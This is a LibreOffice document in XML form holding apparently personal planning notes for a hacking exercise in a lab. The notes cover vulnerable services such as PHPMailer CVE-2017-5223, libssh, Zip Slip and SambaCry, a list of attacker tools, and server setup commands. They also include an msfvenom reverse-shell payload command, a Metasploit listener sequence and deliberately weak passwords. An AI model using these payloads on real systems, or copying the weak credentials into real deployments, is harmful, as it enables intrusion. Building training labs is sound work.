      <style:text-properties fo:font-weight="bold" officeooo:rsid="00a6cf66" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T80" style:family="text">
      <style:text-properties officeooo:rsid="00a7bab7"/>
    </style:style>
    <style:style style:name="T81" style:family="text">
      <style:text-properties officeooo:rsid="00ab9e75"/>
    </style:style>
    <style:style style:name="T82" style:family="text">
      <style:text-properties officeooo:rsid="00ac81b8"/>
    </style:style>
    <style:style style:name="T83" style:family="text">
      <style:text-properties officeooo:rsid="00acfa83"/>
    </style:style>
    <style:style style:name="T84" style:family="text">
      <style:text-properties officeooo:rsid="00b56e98"/>
    </style:style>
    <style:style style:name="T85" style:family="text">
      <style:text-properties officeooo:rsid="00bcfb42"/>
    </style:style>
    <style:style style:name="T86" style:family="text">
      <style:text-properties officeooo:rsid="00c0af7a"/>
    </style:style>
    <style:style style:name="T87" style:family="text">
      <style:text-properties officeooo:rsid="00c27398"/>
    </style:style>
    <style:style style:name="T88" style:family="text">
      <style:text-properties officeooo:rsid="00c36a71"/>
    </style:style>
    <style:style style:name="T89" style:family="text">
      <style:text-properties officeooo:rsid="00c45d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xercise So Far:</text:p>
      <text:p text:style-name="P54"/>
      <text:p text:style-name="P60">The main objective is to obtain the bamba recepy.</text:p>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P63">---------------------------------------------------------------------------------</text:p>
      <text:p text:style-name="P55"><text:span text:style-name="T56">WEBSERVER</text:span><text:span text:style-name="T46">: </text:span><text:span text:style-name="T59">accesible from the attacker.</text:span><text:span text:style-name="T46"> </text:span></text:p>
      <text:p text:style-name="P55"><text:span text:style-name="T46">* using th</text:span><text:span text:style-name="T70">e phpmailer vulnerability – </text:span><text:a xlink:type="simple" xlink:href="https://github.com/vulhub/vulhub/tree/master/phpmailer/CVE-2017-5223" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T69">CVE-2017-5223</text:span></text:a><text:span text:style-name="T15">, </text:span><text:span text:style-name="T16">one can upload a php webshell of choise – need them to create the python script to do the vulnerability or use burpsuit </text:span><text:span text:style-name="T17">or metasploit</text:span><text:span text:style-name="T16">.</text:span></text:p>
      <text:p text:style-name="P92"><text:span text:style-name="T18"/></text:p>
      <text:p text:style-name="P92"><text:span text:style-name="T18">* in the website, </text:span><text:span text:style-name="T19">give a hint about the phpmailer.</text:span></text:p>
      <text:p text:style-name="P75"/>
      <text:p text:style-name="P92"><text:span text:style-name="T18">* consider adding </text:span><text:span text:style-name="T20">phpmyadmin latest for confusion purpeses.</text:span></text:p>
      <text:p text:style-name="P76"/>
      <text:p text:style-name="P76">* <text:span text:style-name="T67">The goal is to get a meterpeter shell - </text:span></text:p>
      <text:p text:style-name="P77">This website shows how to get a meterpeter from a php webshell: <text:span text:style-name="T67">https://www.hacking.reviews/2017/02/webshell-to-meterpreter.html?m=1</text:span></text:p>
      <text:p text:style-name="P76"/>
      <text:p text:style-name="P76"/>
      <text:p text:style-name="P93"><text:span text:style-name="T21">TODO – create the website (bamba website) – </text:span><text:span text:style-name="T22">inside there will be the phpmailer form, in order to inform about the vulnerability</text:span><text:span text:style-name="T21">.</text:span></text:p>
      <text:p text:style-name="P94"/>
      <text:p text:style-name="P63"><text:bookmark-start text:name="__DdeLink__620_2786724775"/><text:bookmark-start text:name="__DdeLink__626_2786724775"/><text:bookmark-start text:name="__DdeLink__618_2786724775"/>---------------------------------------------------------------------------------<text:bookmark-end text:name="__DdeLink__620_2786724775"/><text:bookmark-end text:name="__DdeLink__626_2786724775"/><text:bookmark-end text:name="__DdeLink__618_2786724775"/></text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P71"><text:span text:style-name="T58">LibSSH vulnerability – </text:span><text:span text:style-name="T84">accesible to attacker</text:span><text:span text:style-name="T58">.</text:span></text:p>
      <text:p text:style-name="P63"/>
      <text:p text:style-name="P68">* libssh vulnerability that runs <text:span text:style-name="T57">as user and inside there is the creds for the file server website.</text:span></text:p>
      <text:p text:style-name="P67"/>
      <text:p text:style-name="P67"><text:span text:style-name="T60">in metasploit: </text:span>scanner/ssh/ssh_version</text:p>
      <text:p text:style-name="P67"/>
      <text:p text:style-name="P56">* OPTIONAL – use this machine for a <text:span text:style-name="T48">Microsoft </text:span><text:span text:style-name="T47">office </text:span>exploit or something like that.</text:p>
      <text:p text:style-name="P67"/>
      <text:p text:style-name="P67">---------------------------------------------------------------------------------</text:p>
      <text:p text:style-name="P68"/>
      <text:p text:style-name="P87"><text:span text:style-name="T62">The Zip Slip with the samba share – </text:span><text:span text:style-name="T63">the zip slip </text:span><text:span text:style-name="T64">apache backend</text:span><text:span text:style-name="T62">.</text:span></text:p>
      <text:p text:style-name="P96">Missions:</text:p>
      <text:p text:style-name="P88"/>
      <text:p text:style-name="P89"><text:span text:style-name="T65">* Python ftp server </text:span><text:span text:style-name="T72">with weak default creds – </text:span><text:span text:style-name="T79">check how to do that</text:span><text:span text:style-name="T72">.</text:span></text:p>
      <text:p text:style-name="P89">* <text:span text:style-name="T86">The ftp server has a configuration file of the folder to which the ftp server is pointing.</text:span></text:p>
      <text:p text:style-name="P89">* <text:span text:style-name="T72">The ftp server has </text:span><text:span text:style-name="T87">only </text:span><text:span text:style-name="T72">read </text:span><text:span text:style-name="T87">premision</text:span><text:span text:style-name="T72">.</text:span></text:p>
      <text:p text:style-name="P89">* <text:span text:style-name="T73">In the ftp share there are pcap file and rsa pub key.</text:span></text:p>
      <text:p text:style-name="P97">* <text:span text:style-name="T73">There is a wireshark file containing https comunication to the zip slip website.</text:span></text:p>
      <text:p text:style-name="P89">* <text:span text:style-name="T74">The attacker should open the pcap file using the rsa pub key.</text:span></text:p>
      <text:p text:style-name="P99">* <text:span text:style-name="T76">In The pcap file there is communication that preforms the login -</text:span></text:p>
      <text:p text:style-name="P99"><text:span text:style-name="T76"><text:tab/>- </text:span><text:span text:style-name="T77">One option is to use hashcat in order to open md5 with salt – the md5 of the salt and the password and also the salt is sent</text:span><text:span text:style-name="T76">.</text:span></text:p>
      <text:p text:style-name="P99">- <text:span text:style-name="T78">Another option is to insert a crypto challenge.</text:span></text:p>
      <text:p text:style-name="P100"/>
      <text:p text:style-name="P101"><text:span text:style-name="T80">* </text:span><text:span text:style-name="T88">After connected, use the zip slip vulnerability to over write the configuration so the ftp will point to the location containing the creds for samba</text:span><text:span text:style-name="T81">.</text:span></text:p>
      <text:p text:style-name="P101"/>
      <text:p text:style-name="P101">https://bugs.python.org/issue35909</text:p>
      <text:p text:style-name="P101"/>
      <text:p text:style-name="P63"><text:soft-page-break/>* <text:span text:style-name="T85">TODO ONLINE - </text:span><text:span text:style-name="T66">samba server vulnerable to the samba cry exploit.</text:span></text:p>
      <text:p text:style-name="P63"/>
      <text:p text:style-name="P68"><text:bookmark-start text:name="__DdeLink__818_2392804040"/><text:bookmark-start text:name="__DdeLink__814_2392804040"/><text:bookmark-start text:name="__DdeLink__816_2392804040"/><text:a xlink:type="simple" xlink:href="https://b4d.sablun.org/blog/2020-05-06-247ctf-com-web-slippery-upload/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://b4d.sablun.org/blog/2020-05-06-247ctf-com-web-slippery-upload/</text:a><text:bookmark-end text:name="__DdeLink__818_2392804040"/><text:bookmark-end text:name="__DdeLink__814_2392804040"/><text:bookmark-end text:name="__DdeLink__816_2392804040"/></text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P64"><text:bookmark-start text:name="__DdeLink__622_2786724775"/>---------------------------------------------------------------------------------<text:bookmark-end text:name="__DdeLink__622_2786724775"/></text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P61">BEEF victim – <text:span text:style-name="T53">TODO – </text:span><text:span text:style-name="T55">understand how to exploit using metasploit.</text:span></text:p>
      <text:p text:style-name="P78">https://apprize.best/security/ethical_1/19.html</text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P65"><text:bookmark-start text:name="__DdeLink__624_2786724775"/>---------------------------------------------------------------------------------<text:bookmark-end text:name="__DdeLink__624_2786724775"/></text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P69">VM WITH PYTHON CHALLENGE - <text:span text:style-name="T89">DONE</text:span>.</text:p>
      <text:p text:style-name="P91"/>
      <text:p text:style-name="P66">---------------------------------------------------------------------------------</text:p>
      <text:p text:style-name="P70">More Concepts to incorperate:</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P62">* <text:span text:style-name="T68">Wireshark challenge – open TLS and do something with it.</text:span></text:p>
      <text:p text:style-name="P62">https://www.comparitech.com/net-admin/decrypt-ssl-with-wireshark/</text:p>
      <text:p text:style-name="P62"/>
      <text:p text:style-name="P62">* <text:span text:style-name="T51">Use john the ripper.</text:span></text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P58">* <text:span text:style-name="T50">linux kernel local privelege escelation.</text:span></text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P58">* <text:span text:style-name="T49">Maybe a reversing challenge from Google CTF </text:span><text:span text:style-name="T52">or other CTF</text:span><text:span text:style-name="T49">.</text:span></text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P59">===========================================================</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">Things for the exercise:</text:p>
      <text:p text:style-name="P86">more vulnerable containers:</text:p>
      <text:p text:style-name="P5">https://hub.docker.com/u/vulnerables</text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P51">need to install docker and docker compose.</text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P50">vulnhub.</text:p>
      <text:p text:style-name="P50">this is also very good: <text:bookmark-start text:name="__DdeLink__582_3349739104"/><text:a xlink:type="simple" xlink:href="https://github.com/vulhub" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/vulhub</text:a><text:bookmark-end text:name="__DdeLink__582_3349739104"/></text:p>
      <text:p text:style-name="P50">and this https://github.com/Ignitetechnologies/Vulnhub-CTF-Writeups</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P45">Think of exercises from here: <text:a xlink:type="simple" xlink:href="https://www.sjoerdlangkemper.nl/2018/12/19/practice-hacking-with-vulnerable-systems/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.sjoerdlangkemper.nl/2018/12/19/practice-hacking-with-vulnerable-systems/</text:a></text:p>
      <text:p text:style-name="P45"/>
      <text:p text:style-name="P47">this is also interesting: <text:a xlink:type="simple" xlink:href="https://www.root-me.org/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.root-me.org/</text:a>, <text:a xlink:type="simple" xlink:href="https://www.vulnhub.com/?page=2" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.vulnhub.com/?page=2</text:a></text:p>
      <text:p text:style-name="P47"><text:a xlink:type="simple" xlink:href="https://github.com/apsdehal/awesome-ctf" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/apsdehal/awesome-ctf</text:a> – in the end there are CTFs.</text:p>
      <text:p text:style-name="P47"/>
      <text:p text:style-name="P48">Maybe google ctf: <text:a xlink:type="simple" xlink:href="https://github.com/google/google-ctf" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/google/google-ctf</text:a> – <text:span text:style-name="T41">this is a hard one.</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P35">Take all the tools from kali linux.</text:p>
      <text:p text:style-name="P34">add automation – via an sh file.</text:p>
      <text:p text:style-name="P34">Test with windows WSL or doker for windows.</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P46"><text:soft-page-break/>Maybe powersploit.</text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P44">Possibly have a windows 7 VM so they work with smb.</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P49">Something with wordpress: <text:a xlink:type="simple" xlink:href="https://www.youtube.com/channel/UCKbtBOunnUkc4cy6fuHYJVw" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.youtube.com/channel/UCKbtBOunnUkc4cy6fuHYJVw</text:a></text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P42">Maybe include winrm inside.</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P12">Attacker VM Installations:</text:p>
      <text:p text:style-name="P12"><text:tab/><text:span text:style-name="T71">php webshell: https://github.com/WhiteWinterWolf/wwwolf-php-webshell.git</text:span></text:p>
      <text:p text:style-name="P12"><text:tab/><text:span text:style-name="T42">maybe some cve’s from </text:span><text:span text:style-name="T43">github.</text:span></text:p>
      <text:p text:style-name="P12"><text:tab/>metasploit</text:p>
      <text:p text:style-name="P12"><text:tab/>nmap</text:p>
      <text:p text:style-name="P12"><text:tab/><text:span text:style-name="T40">impacket</text:span></text:p>
      <text:p text:style-name="P12"><text:tab/>beef</text:p>
      <text:p text:style-name="P12"><text:tab/>hexdump</text:p>
      <text:p text:style-name="P12"><text:tab/>net-tools</text:p>
      <text:p text:style-name="P12"><text:tab/><text:span text:style-name="T39">sqlmap</text:span></text:p>
      <text:p text:style-name="P12"><text:tab/><text:span text:style-name="T39">urlfuzzer</text:span></text:p>
      <text:p text:style-name="P13"><text:tab/><text:span text:style-name="T39">burp suite</text:span></text:p>
      <text:p text:style-name="P13"><text:tab/><text:span text:style-name="T40">joomscan – vulnerability scanner for joomla.</text:span><text:tab/></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T39"><text:tab/>Wpscan – </text:span><text:span text:style-name="T40">wordpress vulnerability scanner.</text:span></text:p>
      <text:p text:style-name="P53"><text:span text:style-name="T44"><text:tab/><text:tab/></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">apt update</text:span></text:span></text:p>
      <text:p text:style-name="P53"><text:span text:style-name="T44"><text:tab/><text:tab/></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">apt install curl git libcurl4-openssl-dev make zlib1g-dev gawk g++ gcc libreadline6-dev libssl-dev libyaml-dev libsqlite3-dev sqlite3 autoconf libgdbm-dev libncurses5-dev automake libtool bison pkg-config ruby ruby-bundler ruby-dev -y</text:span></text:span></text:p>
      <text:p text:style-name="P53"><text:span text:style-name="T44"><text:tab/><text:tab/></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">gem install wpscan</text:span></text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P12"><text:tab/><text:span text:style-name="T40">hashcat</text:span></text:p>
      <text:p text:style-name="P12"><text:tab/></text:p>
      <text:p text:style-name="P81"/>
      <text:p text:style-name="P33">Also use urlfuzzer.</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P19">Things to to in web server:</text:p>
      <text:p text:style-name="P19"><text:bookmark-start text:name="__DdeLink__48_3755670151"/><text:bookmark-start text:name="__DdeLink__52_3755670151"/><text:bookmark-start text:name="__DdeLink__30_3755670151"/><text:a xlink:type="simple" xlink:href="https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-phpmyadmin-on-ubuntu-20-04" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-phpmyadmin-on-ubuntu-20-04</text:a><text:bookmark-end text:name="__DdeLink__48_3755670151"/><text:bookmark-end text:name="__DdeLink__30_3755670151"/></text:p>
      <text:p text:style-name="P19"><text:bookmark-end text:name="__DdeLink__52_3755670151"/></text:p>
      <text:p text:style-name="P19"><text:a xlink:type="simple" xlink:href="https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-20-04#step-2-—-installing-mysql" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-20-04#step-2-%E2%80%94-installing-mysql</text:a></text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P19">ssh</text:p>
      <text:p text:style-name="P37">install git</text:p>
      <text:p text:style-name="P19">apt install ufw apache2 <text:bookmark-start text:name="__DdeLink__20_3755670151"/><text:span text:style-name="T30">mysql</text:span><text:bookmark-end text:name="__DdeLink__20_3755670151"/><text:span text:style-name="T30">-server</text:span></text:p>
      <text:p text:style-name="P20"><text:bookmark-start text:name="__DdeLink__22_3755670151"/>service start mysql<text:bookmark-end text:name="__DdeLink__22_3755670151"/></text:p>
      <text:p text:style-name="P20">service start apache2</text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T4">apt</text:span><text:span text:style-name="T5"> </text:span><text:span text:style-name="T4">install</text:span><text:span text:style-name="T5"> </text:span><text:span text:style-name="T6">php libapache2-mod-php php-mysql</text:span></text:p>
      <text:p text:style-name="P22">phpenmod mbstring</text:p>
      <text:p text:style-name="P23"><text:bookmark-start text:name="__DdeLink__24_3755670151"/>service apache2 restart<text:bookmark-end text:name="__DdeLink__24_3755670151"/></text:p>
      <text:p text:style-name="P23"><text:soft-page-break/></text:p>
      <text:p text:style-name="P24">for setting up password for phpmyadmin:</text:p>
      <text:p text:style-name="P24"><text:bookmark-start text:name="__DdeLink__42_3755670151"/>mysql<text:bookmark-end text:name="__DdeLink__42_3755670151"/></text:p>
      <text:p text:style-name="P24"><text:bookmark-start text:name="__DdeLink__44_3755670151"/>SELECT user,authentication_string,plugin,host FROM mysql.user<text:span text:style-name="T31">;</text:span><text:bookmark-end text:name="__DdeLink__44_3755670151"/></text:p>
      <text:p text:style-name="P24"><text:bookmark-start text:name="__DdeLink__46_3755670151"/>ALTER <text:span text:style-name="T32">USER</text:span> <text:span text:style-name="T33">'root'</text:span>@<text:span text:style-name="T33">'localhost'</text:span> IDENTIFIED WITH caching_sha2_password BY <text:span text:style-name="T33">'password'</text:span><text:span text:style-name="T31">;</text:span><text:bookmark-end text:name="__DdeLink__46_3755670151"/></text:p>
      <text:p text:style-name="P36">for the apache web:</text:p>
      <text:p text:style-name="P25">cd /var/www/html</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P38">web server install for vuln:</text:p>
      <text:p text:style-name="P38"><text:span text:style-name="T38">metasploit - </text:span>multi/http/phpmyadmin_null_termination_exec</text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P38"><text:a xlink:type="simple" xlink:href="https://devanswers.co/manually-upgrade-phpmyadmin/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://devanswers.co/manually-upgrade-phpmyadmin/</text:a></text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P39"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">apt-get update</text:span></text:span></text:p>
      <text:p text:style-name="P40"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9"/></text:span></text:p>
      <text:p text:style-name="P40"><text:bookmark-start text:name="__DdeLink__34_3755670151"/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">apt install wget</text:span></text:span><text:bookmark-end text:name="__DdeLink__34_3755670151"/></text:p>
      <text:p text:style-name="P1"><text:bookmark text:name="__DdeLink__40_3755670151"/><text:bookmark text:name="__DdeLink__38_3755670151"/><text:bookmark text:name="__DdeLink__36_3755670151"/><text:bookmark text:name="__DdeLink__32_3755670151"/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T34"/></text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T35"/></text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">apt-get install apache2 apache2-dev</text:span></text:span></text:p>
      <text:p text:style-name="P26"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T37"/></text:span></text:p>
      <text:p text:style-name="P26"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">sudo apt-get install \ libxml2-dev \ libcurl4-openssl-dev \ libjpeg-dev \ libpng-dev \ libxpm-dev \ libmysqlclient-dev \ libpq-dev \ libicu-dev \ libfreetype6-dev \ libldap2-dev \ libxslt-dev \ libssl-dev \ libldb-dev</text:span></text:span></text:p>
      <text:p text:style-name="P26"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T37"/></text:span></text:p>
      <text:p text:style-name="P26"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">apt-get install build-essential</text:span></text:span></text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P41">=========================</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P3"><text:bookmark-start text:name="__DdeLink__55_3755670151"/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">apt-get install software-properties-common</text:span></text:span><text:bookmark-end text:name="__DdeLink__55_3755670151"/></text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">add-apt-repository ppa:ondrej/php</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">apt-get update</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">apt-get install php5.6 php5.6-mysql php5.6-g<text:span text:style-name="T45">op</text:span>d php5.6-mcrypt php5.6-mbstring php5.6-sqlite3 apache2 libapache2-mod-php5.6</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P29">apt install mysql-server</text:p>
      <text:p text:style-name="P29">service mysql start</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P29">apt install apache2</text:p>
      <text:p text:style-name="P29">service apache2 start</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P29">apt install phpmyadmin</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P28"><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/48552306/how-to-install-phpmyadmin-4-7-7-on-ubuntu" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://stackoverflow.com/questions/48552306/how-to-install-phpmyadmin-4-7-7-on-ubuntu</text:a></text:p>
      <text:p text:style-name="P41">=========================</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"><text:soft-page-break/></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P10">Things:</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P15">msfvenom cheatsheet: <text:a xlink:type="simple" xlink:href="https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/</text:a></text:p>
      <text:p text:style-name="P17">metasploit cheatsheet.</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P10">Metasploit: </text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T25"><text:tab/>create a conna</text:span><text:span text:style-name="T26">e</text:span><text:span text:style-name="T25">cting shell: </text:span><text:bookmark-start text:name="__DdeLink__8_3755670151"/><text:bookmark-start text:name="__DdeLink__802_2392804040"/><text:span text:style-name="T3">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; shell.elf</text:span><text:bookmark-end text:name="__DdeLink__8_3755670151"/><text:bookmark-end text:name="__DdeLink__802_2392804040"/></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P82"><text:span text:style-name="T25"><text:tab/></text:span><text:span text:style-name="T27">setup a listener:</text:span></text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30">$ ./msfconsole -q</text:p>
      <text:p text:style-name="P4">msf <text:span text:style-name="T28">&gt;</text:span> <text:bookmark-start text:name="__DdeLink__10_3755670151"/><text:bookmark-start text:name="__DdeLink__804_2392804040"/>use exploit/multi/handler<text:bookmark-end text:name="__DdeLink__10_3755670151"/><text:bookmark-end text:name="__DdeLink__804_2392804040"/></text:p>
      <text:p text:style-name="P4">msf exploit(handler) <text:span text:style-name="T28">&gt;</text:span> <text:bookmark-start text:name="__DdeLink__806_2392804040"/>set payload linux/x86/meterpreter/reverse_tcp<text:bookmark-end text:name="__DdeLink__806_2392804040"/></text:p>
      <text:p text:style-name="P72"><text:span text:style-name="T11">msf exploit(handler) </text:span><text:span text:style-name="T13">&gt;</text:span><text:span text:style-name="T11"> </text:span><text:bookmark-start text:name="__DdeLink__12_3755670151"/><text:bookmark-start text:name="__DdeLink__809_2392804040"/><text:span text:style-name="T14">set</text:span><text:span text:style-name="T11"> lhost </text:span><text:bookmark-end text:name="__DdeLink__12_3755670151"/><text:span text:style-name="T12">172.17.0.2</text:span><text:bookmark-end text:name="__DdeLink__809_2392804040"/></text:p>
      <text:p text:style-name="P4">lhost =<text:span text:style-name="T28">&gt;</text:span> 192.168.1.123</text:p>
      <text:p text:style-name="P4">msf exploit(handler) <text:span text:style-name="T28">&gt;</text:span> <text:span text:style-name="T29">set</text:span> lport 4444</text:p>
      <text:p text:style-name="P4">lport =<text:span text:style-name="T28">&gt;</text:span> 4444</text:p>
      <text:p text:style-name="P4">msf exploit(handler) <text:span text:style-name="T28">&gt;</text:span> run</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P16">metasploit put shell in background.</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P84">Find local pe</text:p>
      <text:p text:style-name="P74"><text:bookmark-start text:name="__DdeLink__812_2392804040"/>post/multi/recon/local_exploit_suggest<text:bookmark-end text:name="__DdeLink__812_2392804040"/><text:span text:style-name="T61">er</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P7">To enable ssh connection:</text:p>
      <text:p text:style-name="P7"><text:tab/><text:span text:style-name="T24">when sudo: passwd with password 123</text:span></text:p>
      <text:p text:style-name="P7"><text:tab/>adduser moses <text:span text:style-name="T24">with password 123</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__616_2786724775"/><text:bookmark-start text:name="__DdeLink__18_3755670151"/><text:bookmark-start text:name="__DdeLink__26_3755670151"/><text:bookmark-start text:name="__DdeLink__6_3755670151"/><text:bookmark-start text:name="__DdeLink__16_3755670151"/><text:bookmark-start text:name="__DdeLink__14_3755670151"/><text:span text:style-name="T1">usermod -aG sudo moses</text:span><text:bookmark-end text:name="__DdeLink__616_2786724775"/><text:bookmark-end text:name="__DdeLink__18_3755670151"/><text:bookmark-end text:name="__DdeLink__26_3755670151"/><text:bookmark-end text:name="__DdeLink__6_3755670151"/><text:bookmark-end text:name="__DdeLink__16_3755670151"/><text:bookmark-end text:name="__DdeLink__14_3755670151"/></text:p>
      <text:p text:style-name="P9"><text:tab/>look at: https://bencane.com/2013/07/22/ssh-disable-host-checking-for-scripts-automation/</text:p>
      <text:p text:style-name="P8"><text:tab/><text:span text:style-name="T23">change the file in the path: </text:span><text:bookmark-start text:name="__DdeLink__4_3755670151"/><text:bookmark text:name="__DdeLink__1_3755670151"/><text:span text:style-name="T2">/etc/ssh/sshd_config</text:span><text:bookmark-end text:name="__DdeLink__4_3755670151"/></text:p>
      <text:p text:style-name="P31"><text:tab/>put inside the following content:</text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P3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liberation mono', 'courier new', monospace"/>
    <style:font-face style:name="Monaco1" svg:font-family="Monaco, Consolas, 'Andale Mono', 'DejaVu Sans Mono', monospace"/>
    <style:font-face style:name="Monaco2" svg:font-family="Monaco, Menlo, Consolas, 'Courier New', monospace"/>
    <style:font-face style:name="Monaco" svg:font-family="Monaco, monospace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ato" svg:font-family="lat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7:38:42.908746563</meta:creation-date>
    <dc:date>2020-11-30T00:43:24.562000543</dc:date>
    <meta:editing-duration>P5DT12M56S</meta:editing-duration>
    <meta:editing-cycles>146</meta:editing-cycles>
    <meta:generator>LibreOffice/6.4.6.2$Linux_X86_64 LibreOffice_project/40$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="5" meta:paragraph-count="143" meta:word-count="796" meta:character-count="6923" meta:non-whitespace-character-count="6218"/>
  </office:meta>
</office:document-meta>
</file>